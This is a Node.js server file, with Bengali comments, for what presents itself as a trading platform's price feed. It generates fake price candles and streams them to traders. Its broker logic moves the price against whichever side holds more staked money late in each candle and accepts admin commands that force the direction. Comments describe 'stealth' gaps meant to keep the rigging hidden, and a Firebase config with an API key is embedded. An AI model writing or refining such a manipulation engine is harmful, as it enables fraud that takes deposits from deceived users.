// --- START OF FILE server.js (v21-Final: Random Stealth Engine) ---

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const firebase = require('firebase/app');
require('firebase/database');

// 🔥 Firebase Config
const firebaseConfig = {
  apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
  authDomain: "ictex-trade.firebaseapp.com",
  databaseURL: "https://ictex-trade-default-rtdb.firebaseio.com",
  projectId: "ictex-trade",
  storageBucket: "ictex-trade.appspot.com",
  messagingSenderId: "755532704199",
  appId: "1:755532704199:web:b27d7c9e7d0f4ac76291e2"
};

if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const app = express();
app.use(cors());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const MAX_CANDLES_IN_RAM = 3000;
const TIMEFRAME = 60000; 
const TICK_MS = 200; 
const FIREBASE_BACKUP_INTERVAL = 60000; 
const HISTORY_SEED_COUNT = 300;

const markets = {}; 
const activeTradesInRAM = {}; 
const adminCommandInRAM = {}; 

function roundPrice(v) { return parseFloat(v.toFixed(5)); }
function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }
function cloneCandle(c) { return { timestamp: c.timestamp, open: c.open, high: c.high, low: c.low, close: c.close }; }

function startSyncEngines() {
    db.ref('admin/activeTrades').on('value', (snap) => {
        const data = snap.val() || {};
        Object.keys(data).forEach(id => {
            let up = 0, down = 0;
            Object.values(data[id]).forEach(t => {
                if (t.direction === 'UP') up += parseFloat(t.amount);
                else down += parseFloat(t.amount);
            });
            activeTradesInRAM[id] = { up, down };
        });
    });
    db.ref('admin/market_overrides').on('value', (snap) => {
        const data = snap.val() || {};
        Object.keys(data).forEach(id => { adminCommandInRAM[id] = data[id]; });
    });
}

// 🎯 RANDOM STEALTH GAP (v21)
// এটি উইন-লসের সাথে কানেক্টেড না, এটি পুরোপুরি র‍্যান্ডম।
function calculateRandomStealthGap(lastClose) {
    // ০.০৮ প্রোবাবিলিটি মানে হলো গড়ে ঘণ্টায় ৪-৫ বার গ্যাপ হবে
    const shouldGap = Math.random() < 0.08; 
    if (!shouldGap) return lastClose;

    // গ্যাপ সাইজ হবে ৩ থেকে ১০ পয়েন্টের মধ্যে
    const gapSize = lastClose * (0.00003 + Math.random() * 0.00007);
    const direction = Math.random() > 0.5 ? 1 : -1;
    
    return roundPrice(lastClose + (gapSize * direction));
}

function ensureCurrentPeriodCandle(marketData, currentPeriod) {
  let lastCandle = marketData.history[marketData.history.length - 1];
  if (!lastCandle) return null;

  if (currentPeriod > lastCandle.timestamp) {
    const missingCount = Math.floor((currentPeriod - lastCandle.timestamp) / TIMEFRAME);
    for (let i = 0; i < missingCount; i++) {
      const newTimestamp = lastCandle.timestamp + TIMEFRAME;
      
      // নতুন ক্যান্ডেল শুরুর সময় র‍্যান্ডম গ্যাপ চেক করা হচ্ছে
      const newOpen = calculateRandomStealthGap(lastCandle.close);
      
      const newCandle = {
        timestamp: newTimestamp, open: newOpen, high: newOpen, low: newOpen, close: newOpen
      };
      marketData.history.push(newCandle);
      marketData.currentPrice = newOpen;
      if (marketData.history.length > MAX_CANDLES_IN_RAM) marketData.history.shift();
      lastCandle = newCandle;
    }
  }
  return lastCandle;
}

function calculateBrokerLogic(marketData, candle) {
    const now = Date.now();
    const secondsPassed = new Date(now).getSeconds();
    const marketId = marketData.marketId;
    const adminCmd = adminCommandInRAM[marketId];
    let bias = null;
    let force = 0;

    // ১. এডমিন কমান্ড (সর্বোচ্চ প্রায়োরিটি)
    if (adminCmd && (now - adminCmd.timestamp < 65000)) {
        bias = (adminCmd.type === 'UP' || adminCmd.type === 'GREEN') ? 'UP' : 'DOWN';
        force = 0.00005;
    } 
    // ২. ৩০ সেকেন্ডের পর উইন-লস কন্ট্রোল (স্মুথ মুভমেন্টের মাধ্যমে)
    else if (secondsPassed > 30) {
        const trades = activeTradesInRAM[marketId] || { up: 0, down: 0 };
        if (Math.abs(trades.up - trades.down) > 1) { 
            if (trades.up > trades.down) bias = 'DOWN';
            else if (trades.down > trades.up) bias = 'UP';
            // চাপ বাড়ানোর হার অত্যন্ত কম রাখা হয়েছে যাতে গ্রাফ স্মুথ থাকে
            force = (secondsPassed - 30) * 0.0000012;
        }
    }

    let move = (Math.random() - 0.5) * (candle.open * 0.00012);

    if (bias) {
        if (bias === 'UP') move = Math.abs(move) + (candle.open * force);
        else move = -Math.abs(move) - (candle.open * force);
    }

    marketData.currentPrice += move;
}

async function initializeNewMarket(marketId) {
  const path = marketPathFromId(marketId);
  let startPrice = 1.15;
  try {
    const liveSnap = await db.ref(`markets/${path}/live`).once('value');
    const lastLive = liveSnap.val();
    if (lastLive && lastLive.price) startPrice = lastLive.price;
  } catch (e) {}
  const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
  const candles = [];
  let currentPrice = startPrice;
  for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
    const c = (function(ts, o){
        const isG = Math.random() > 0.5;
        const b = (0.00006 + Math.random() * 0.00022) * o;
        const cl = isG ? o + b : o - b;
        return { timestamp: ts, open: roundPrice(o), high: roundPrice(Math.max(o, cl) + 0.0001), low: roundPrice(Math.min(o, cl) - 0.0001), close: roundPrice(cl) };
    })(nowPeriod - (i * TIMEFRAME), currentPrice);
    candles.push(c);
    currentPrice = c.close;
  }
  markets[marketId] = { marketId, marketPath: path, history: candles, currentPrice };
}

function broadcastCandle(marketId, candle) {
  const payload = JSON.stringify({ market: marketId, candle, serverTime: Date.now() });
  wss.clients.forEach((client) => {
    if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
      client.send(payload);
    }
  });
}

async function mirrorLivePriceToFirebase(marketData, candle) {
  try {
    await db.ref(`markets/${marketData.marketPath}/live`).set({ price: candle.close, timestamp: candle.timestamp });
  } catch (err) {}
}

db.ref('admin/markets').on('value', (snapshot) => {
  const fbMarkets = snapshot.val() || {};
  Object.keys(fbMarkets).forEach((id) => {
    if (!markets[id] && fbMarkets[id].status === 'active') initializeNewMarket(id);
  });
});

wss.on('connection', (ws) => {
    ws.subscribedMarket = null;
    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());
            if (msg.type === 'subscribe' && msg.market) ws.subscribedMarket = msg.market;
        } catch(e) {}
    });
});

setInterval(() => {
  const now = Date.now();
  const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;
  for (const marketId in markets) {
    const marketData = markets[marketId];
    let candle = ensureCurrentPeriodCandle(marketData, currentPeriod);
    if (!candle) continue;
    calculateBrokerLogic(marketData, candle);
    candle.close = roundPrice(marketData.currentPrice);
    candle.high = Math.max(candle.high, candle.close);
    candle.low = Math.min(candle.low, candle.close);
    broadcastCandle(marketId, candle);
  }
  if (now % FIREBASE_BACKUP_INTERVAL < TICK_MS) {
      for (const marketId in markets) {
          const marketData = markets[marketId];
          const lastCandle = marketData.history[marketData.history.length-1];
          if(lastCandle) mirrorLivePriceToFirebase(marketData, lastCandle);
      }
  }
}, TICK_MS);

startSyncEngines();
app.get('/ping', (_req, res) => res.send('UltraSmooth V21-Final: Random Gap Engine Active'));
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Broker Engine v21 active on ${PORT}`));

// --- END OF FILE server.js ---